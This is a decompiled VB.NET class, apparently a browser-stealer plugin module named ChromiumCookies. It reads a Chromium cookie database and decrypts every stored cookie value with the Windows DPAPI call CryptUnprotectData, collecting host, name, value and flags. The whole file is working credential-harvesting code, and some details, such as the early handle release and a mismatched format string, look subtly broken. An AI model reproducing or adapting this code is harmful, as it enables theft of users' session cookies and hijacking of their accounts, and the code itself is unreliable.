Imports System
Imports System.Collections.Generic
Imports System.Runtime.InteropServices
Imports System.Text

Namespace Plugin.Browsers.Chromium
	' Token: 0x02000015 RID: 21
	Public Class ChromiumCookies
		' Token: 0x06000094 RID: 148 RVA: 0x00006C60 File Offset: 0x00004E60
		Private Shared Function FromUnixTime(unixTime As Long) As DateTime
			Dim epoch As DateTime = New DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc)
			Return epoch.AddSeconds(CDbl(unixTime))
		End Function

		' Token: 0x06000095 RID: 149 RVA: 0x00006C90 File Offset: 0x00004E90
		Private Shared Function ToUnixTime(value As DateTime) As Long
			Return CLng((value - New DateTime(1970, 1, 1, 0, 0, 0, 0).ToLocalTime()).TotalSeconds)
		End Function

		' Token: 0x06000096 RID: 150 RVA: 0x00006CCC File Offset: 0x00004ECC
		Public Shared Function Cookies(FileCookie As String) As List(Of ChromiumCookies.ChromiumCookie)
			Dim data As List(Of ChromiumCookies.ChromiumCookie) = New List(Of ChromiumCookies.ChromiumCookie)()
			Dim sql As SQLiteHandler = New SQLiteHandler(FileCookie)
			Dim totalEntries As Integer = sql.GetRowCount()
			For i As Integer = 0 To totalEntries - 1
				Try
					Dim h As String = sql.GetValue(i, "host_key")
					Dim name As String = sql.GetValue(i, "name")
					Dim encval As String = sql.GetValue(i, "encrypted_value")
					Dim val As String = ChromiumCookies.Decrypt(Encoding.[Default].GetBytes(encval))
					Dim valu As String = sql.GetValue(i, "value")
					Dim path As String = sql.GetValue(i, "path")
					Dim secure As Boolean = Not(sql.GetValue(i, "is_secure") = "0")
					Dim http As Boolean = Not(sql.GetValue(i, "is_httponly") = "0")
					Dim expiryTime As Long = Long.Parse(sql.GetValue(i, "expires_utc"))
					Dim currentTime As Long = ChromiumCookies.ToUnixTime(DateTime.Now)
					Dim convertedTime As Long = (expiryTime - 11644473600000000L) / 1000000L
					Dim [date] As DateTime = New DateTime(1970, 1, 1, 0, 0, 0, 0)
					[date] = [date].AddSeconds(CDbl(convertedTime))
					Dim exp As DateTime = ChromiumCookies.FromUnixTime(convertedTime)
					Dim expired As Boolean = currentTime > convertedTime
					data.Add(New ChromiumCookies.ChromiumCookie() With { .Host = h, .ExpiresUTC = exp, .Expired = expired, .Name = name, .EncValue = val, .Value = valu, .Path = path, .Secure = secure, .HttpOnly = http })
				Catch ex As Exception
					Return data
				End Try
			Next
			Return data
		End Function

		' Token: 0x06000097 RID: 151 RVA: 0x00006E8C File Offset: 0x0000508C
		Private Shared Function Decrypt(Datas As Byte()) As String
			Dim result As String
			Try
				Dim data_BLOB As ChromiumCookies.DATA_BLOB = Nothing
				Dim data_BLOB2 As ChromiumCookies.DATA_BLOB = Nothing
				Dim gchandle As GCHandle = GCHandle.Alloc(Datas, GCHandleType.Pinned)
				Dim data_BLOB3 As ChromiumCookies.DATA_BLOB
				data_BLOB3.pbData = gchandle.AddrOfPinnedObject()
				data_BLOB3.cbData = Datas.Length
				gchandle.Free()
				Dim cryptprotect_PROMPTSTRUCT As ChromiumCookies.CRYPTPROTECT_PROMPTSTRUCT = Nothing
				Dim empty As String = String.Empty
				ChromiumCookies.CryptUnprotectData(data_BLOB3, Nothing, data_BLOB2, CType(0, IntPtr), cryptprotect_PROMPTSTRUCT, CType(0, ChromiumCookies.CryptProtectFlags), data_BLOB)
				Dim array As Byte() = New Byte(data_BLOB.cbData + 1 - 1) {}
				Marshal.Copy(data_BLOB.pbData, array, 0, data_BLOB.cbData)
				Dim [string] As String = Encoding.UTF8.GetString(array)
				result = [string].Substring(0, [string].Length - 1)
			Catch
				result = ""
			End Try
			Return result
		End Function

		' Token: 0x06000098 RID: 152
		Private Declare Auto Function CryptProtectData Lib "Crypt32.dll" (ByRef pDataIn As ChromiumCookies.DATA_BLOB, szDataDescr As String, ByRef pOptionalEntropy As ChromiumCookies.DATA_BLOB, pvReserved As IntPtr, ByRef pPromptStruct As ChromiumCookies.CRYPTPROTECT_PROMPTSTRUCT, dwFlags As ChromiumCookies.CryptProtectFlags, ByRef pDataOut As ChromiumCookies.DATA_BLOB) As <MarshalAs(UnmanagedType.Bool)> Boolean

		' Token: 0x06000099 RID: 153
		Private Declare Auto Function CryptUnprotectData Lib "Crypt32.dll" (ByRef pDataIn As ChromiumCookies.DATA_BLOB, szDataDescr As StringBuilder, ByRef pOptionalEntropy As ChromiumCookies.DATA_BLOB, pvReserved As IntPtr, ByRef pPromptStruct As ChromiumCookies.CRYPTPROTECT_PROMPTSTRUCT, dwFlags As ChromiumCookies.CryptProtectFlags, ByRef pDataOut As ChromiumCookies.DATA_BLOB) As <MarshalAs(UnmanagedType.Bool)> Boolean

		' Token: 0x02000027 RID: 39
		Public Class ChromiumCookie
			' Token: 0x1700002F RID: 47
			' (get) Token: 0x060000E6 RID: 230 RVA: 0x00007201 File Offset: 0x00005401
			' (set) Token: 0x060000E7 RID: 231 RVA: 0x00007209 File Offset: 0x00005409
			Public Property Host As String

			' Token: 0x17000030 RID: 48
			' (get) Token: 0x060000E8 RID: 232 RVA: 0x00007212 File Offset: 0x00005412
			' (set) Token: 0x060000E9 RID: 233 RVA: 0x0000721A File Offset: 0x0000541A
			Public Property Name As String

			' Token: 0x17000031 RID: 49
			' (get) Token: 0x060000EA RID: 234 RVA: 0x00007223 File Offset: 0x00005423
			' (set) Token: 0x060000EB RID: 235 RVA: 0x0000722B File Offset: 0x0000542B
			Public Property Value As String

			' Token: 0x17000032 RID: 50
			' (get) Token: 0x060000EC RID: 236 RVA: 0x00007234 File Offset: 0x00005434
			' (set) Token: 0x060000ED RID: 237 RVA: 0x0000723C File Offset: 0x0000543C
			Public Property EncValue As String

			' Token: 0x17000033 RID: 51
			' (get) Token: 0x060000EE RID: 238 RVA: 0x00007245 File Offset: 0x00005445
			' (set) Token: 0x060000EF RID: 239 RVA: 0x0000724D File Offset: 0x0000544D
			Public Property Path As String

			' Token: 0x17000034 RID: 52
			' (get) Token: 0x060000F0 RID: 240 RVA: 0x00007256 File Offset: 0x00005456
			' (set) Token: 0x060000F1 RID: 241 RVA: 0x0000725E File Offset: 0x0000545E
			Public Property ExpiresUTC As DateTime

			' Token: 0x17000035 RID: 53
			' (get) Token: 0x060000F2 RID: 242 RVA: 0x00007267 File Offset: 0x00005467
			' (set) Token: 0x060000F3 RID: 243 RVA: 0x0000726F File Offset: 0x0000546F
			Public Property Secure As Boolean

			' Token: 0x17000036 RID: 54
			' (get) Token: 0x060000F4 RID: 244 RVA: 0x00007278 File Offset: 0x00005478
			' (set) Token: 0x060000F5 RID: 245 RVA: 0x00007280 File Offset: 0x00005480
			Public Property HttpOnly As Boolean

			' Token: 0x17000037 RID: 55
			' (get) Token: 0x060000F6 RID: 246 RVA: 0x00007289 File Offset: 0x00005489
			' (set) Token: 0x060000F7 RID: 247 RVA: 0x00007291 File Offset: 0x00005491
			Public Property Expired As Boolean

			' Token: 0x060000F8 RID: 248 RVA: 0x0000729C File Offset: 0x0000549C
			Public Overrides Function ToString() As String
				Return String.Format("Host: {1}{0}Name: {2}{0}Value: {8}Path: {4}{0}Expired: {5}{0}HttpOnly: {6}{0}Secure: {7}", New Object() { Environment.NewLine, Me.Host, Me.Name, Me.Value, Me.Path, Me.Expired, Me.HttpOnly, Me.Secure, Me.EncValue })
			End Function
		End Class

		' Token: 0x02000028 RID: 40
		<StructLayout(LayoutKind.Sequential, CharSet := CharSet.Unicode)>
		Private Structure DATA_BLOB
			' Token: 0x04000079 RID: 121
			Public cbData As Integer

			' Token: 0x0400007A RID: 122
			Public pbData As IntPtr
		End Structure

		' Token: 0x02000029 RID: 41
		<StructLayout(LayoutKind.Sequential, CharSet := CharSet.Unicode)>
		Private Structure CRYPTPROTECT_PROMPTSTRUCT
			' Token: 0x0400007B RID: 123
			Public cbSize As Integer

			' Token: 0x0400007C RID: 124
			Public dwPromptFlags As ChromiumCookies.CryptProtectPromptFlags

			' Token: 0x0400007D RID: 125
			Public hwndApp As IntPtr

			' Token: 0x0400007E RID: 126
			Public szPrompt As String
		End Structure

		' Token: 0x0200002A RID: 42
		<Flags()>
		Private Enum CryptProtectPromptFlags
			' Token: 0x04000080 RID: 128
			CRYPTPROTECT_PROMPT_ON_UNPROTECT = 1
			' Token: 0x04000081 RID: 129
			CRYPTPROTECT_PROMPT_ON_PROTECT = 2
		End Enum

		' Token: 0x0200002B RID: 43
		<Flags()>
		Private Enum CryptProtectFlags
			' Token: 0x04000083 RID: 131
			CRYPTPROTECT_UI_FORBIDDEN = 1
			' Token: 0x04000084 RID: 132
			CRYPTPROTECT_LOCAL_MACHINE = 4
			' Token: 0x04000085 RID: 133
			CRYPTPROTECT_CRED_SYNC = 8
			' Token: 0x04000086 RID: 134
			CRYPTPROTECT_AUDIT = 16
			' Token: 0x04000087 RID: 135
			CRYPTPROTECT_NO_RECOVERY = 32
			' Token: 0x04000088 RID: 136
			CRYPTPROTECT_VERIFY_PROTECTION = 64
		End Enum
	End Class
End Namespace
